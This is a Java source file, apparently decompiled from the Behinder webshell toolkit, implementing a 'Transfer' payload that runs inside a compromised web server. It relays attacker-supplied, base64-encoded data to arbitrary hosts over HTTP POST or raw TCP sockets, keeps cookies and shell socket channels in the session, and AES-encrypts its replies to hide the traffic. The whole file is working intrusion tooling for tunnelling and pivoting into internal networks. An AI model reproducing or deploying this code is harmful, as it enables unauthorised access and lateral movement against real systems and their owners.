package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Transfer {
   public static String target;
   public static String payloadBody;
   public static String type;
   public static String effectHeaders;
   public static String direction;
   private Object Request;
   private Object Response;
   private Object Session;

   public boolean equals(Object obj) {
      HashMap result = new HashMap();

      try {
         this.fillContext(obj);
         if (type.equals("TCP")) {
            this.transSocket();
         } else {
            Object so;
            if (type.equals("append")) {
               synchronized(this) {
                  Object payloadObj = this.sessionGetAttribute(this.Session, "transfer_" + target);
                  if (payloadObj == null) {
                     this.sessionSetAttribute(this.Session, "transfer_" + target, payloadBody);
                  } else {
                     this.sessionSetAttribute(this.Session, "transfer_" + target, payloadObj + payloadBody);
                  }
               }

               result.put("status", "success");

               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  Method write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var10) {
               }
            } else {
               so = (Map)this.sessionGetAttribute(this.Session, target);
               String headerLine;
               if (so == null) {
                  so = new HashMap();
                  if (!effectHeaders.equals("")) {
                     String[] var14 = effectHeaders.split("\n");
                     int var5 = var14.length;

                     for(int var6 = 0; var6 < var5; ++var6) {
                        headerLine = var14[var6];
                        String headerName = headerLine.split("\\|")[0];
                        String headerValue = headerLine.split("\\|")[1];
                        ((Map)so).put(headerName, headerValue);
                     }
                  }

                  this.sessionSetAttribute(this.Session, target, so);
               }

               Map transResultObj = this.sendPostRequestBinary(target, (Map)so, this.base64decode(payloadBody));
               Map responseHeader = (Map)transResultObj.get("header");
               Iterator var17 = responseHeader.keySet().iterator();

               while(var17.hasNext()) {
                  headerLine = (String)var17.next();
                  if (headerLine != null && headerLine.equalsIgnoreCase("Set-Cookie")) {
                     ((Map)so).put("Cookie", responseHeader.get(headerLine));
                  }
               }

               if (((String)responseHeader.get("status")).equals("200")) {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  Method write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, transResultObj.get("data"));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               }
            }
         }
      } catch (Exception var12) {
         var12.printStackTrace();
         result.put("msg", var12.getMessage());
         result.put("status", "success");
      }

      return true;
   }

   private void transSocket() throws Exception {
      String key = String.format("BShell_%s_%s", direction, target);
      byte[] payload = this.base64decode(payloadBody);
      SocketChannel bShellSocketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, key);
      if (bShellSocketChannel == null || !bShellSocketChannel.isConnected() || !bShellSocketChannel.isOpen()) {
         if (direction.equals("Reverse")) {
            throw new Exception("No Reverse BShell for " + target);
         }

         bShellSocketChannel = SocketChannel.open();
         bShellSocketChannel.connect(new InetSocketAddress(target.split(":")[0], Integer.parseInt(target.split(":")[1])));
         this.sessionSetAttribute(this.Session, key, bShellSocketChannel);
      }

      try {
         bShellSocketChannel.socket().getOutputStream().write(payload);
         bShellSocketChannel.socket().getOutputStream().flush();
      } catch (Exception var7) {
         bShellSocketChannel.close();
         bShellSocketChannel = null;
      }

      String result = new String(this.readLine(bShellSocketChannel.socket().getInputStream()));
      Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
      Method write = so.getClass().getMethod("write", byte[].class);
      write.invoke(so, result.getBytes());
      so.getClass().getMethod("flush").invoke(so);
      so.getClass().getMethod("close").invoke(so);
   }

   private byte[] readLine(InputStream in) throws IOException {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      boolean var3 = true;

      int c;
      while((c = in.read()) != -1 && c != 10 && c != 13) {
         bos.write(c);
      }

      return bos.toByteArray();
   }

   private void setHeader(String key, String value) {
      try {
         this.Response.getClass().getMethod("setHeader", String.class, String.class).invoke(this.Response, key, value);
      } catch (Exception var4) {
      }

   }

   private Map sendPostRequestBinary(String urlPath, Map header, byte[] data) throws Exception {
      Map result = new HashMap();
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      URL url = new URL(urlPath);
      HttpURLConnection conn = (HttpURLConnection)url.openConnection();
      conn.setConnectTimeout(15000);
      conn.setUseCaches(false);
      conn.setRequestMethod("POST");
      int length;
      if (header != null) {
         Object[] keys = header.keySet().toArray();
         Arrays.sort(keys);
         Object[] var9 = keys;
         int var10 = keys.length;

         for(length = 0; length < var10; ++length) {
            Object key = var9[length];
            conn.setRequestProperty(key.toString(), (String)header.get(key));
         }
      }

      conn.setDoOutput(true);
      conn.setDoInput(true);
      conn.setUseCaches(false);
      OutputStream outwritestream = conn.getOutputStream();
      outwritestream.write(data);
      outwritestream.flush();
      outwritestream.close();
      if (conn.getResponseCode() == 200) {
         String encoding = conn.getContentEncoding();
         DataInputStream din;
         byte[] buffer;
         boolean var24;
         if (encoding != null) {
            if (encoding != null && encoding.equals("gzip")) {
               din = null;
               GZIPInputStream gZIPInputStream = new GZIPInputStream(conn.getInputStream());
               din = new DataInputStream(gZIPInputStream);
               buffer = new byte[1024];
               boolean var13 = false;

               while((length = din.read(buffer)) != -1) {
                  bos.write(buffer, 0, length);
               }
            } else {
               din = new DataInputStream(conn.getInputStream());
               buffer = new byte[1024];
               var24 = false;

               while((length = din.read(buffer)) != -1) {
                  bos.write(buffer, 0, length);
               }
            }
         } else {
            din = new DataInputStream(conn.getInputStream());
            buffer = new byte[1024];
            var24 = false;

            while((length = din.read(buffer)) != -1) {
               bos.write(buffer, 0, length);
            }
         }

         byte[] resData = bos.toByteArray();
         result.put("data", resData);
         Map responseHeader = new HashMap();
         Iterator var28 = conn.getHeaderFields().keySet().iterator();

         while(var28.hasNext()) {
            String key = (String)var28.next();
            responseHeader.put(key, conn.getHeaderField(key));
         }

         responseHeader.put("status", conn.getResponseCode() + "");
         result.put("header", responseHeader);
         return result;
      } else {
         DataInputStream din = new DataInputStream(conn.getErrorStream());
         byte[] buffer = new byte[1024];
         boolean var21 = false;

         while((length = din.read(buffer)) != -1) {
            bos.write(buffer, 0, length);
         }

         throw new Exception(new String(bos.toByteArray(), "GBK"));
      }
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private byte[] base64decode(String text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result = null;

      try {
         Class Base64;
         Object Decoder;
         if (version.compareTo("1.9") >= 0) {
            this.getClass();
            Base64 = Class.forName("java.util.Base64");
            Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
         } else {
            this.getClass();
            Base64 = Class.forName("sun.misc.BASE64Decoder");
            Decoder = Base64.newInstance();
            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
         }
      } catch (Exception var6) {
      }

      return result;
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
         var5.printStackTrace();
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
         var5.printStackTrace();
      }

   }

   private Enumeration getHeaderNames(Object request) {
      Enumeration result = null;

      try {
         result = (Enumeration)request.getClass().getMethod("getHeaderNames").invoke(request);
      } catch (Exception var4) {
      }

      return result;
   }

   private String getHeader(Object request, String headerName) {
      String result = null;

      try {
         result = request.getClass().getMethod("getHeader", String.class).invoke(request, headerName).toString();
      } catch (Exception var5) {
      }

      return result;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = entity.getOrDefault(key, "null").toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }
}
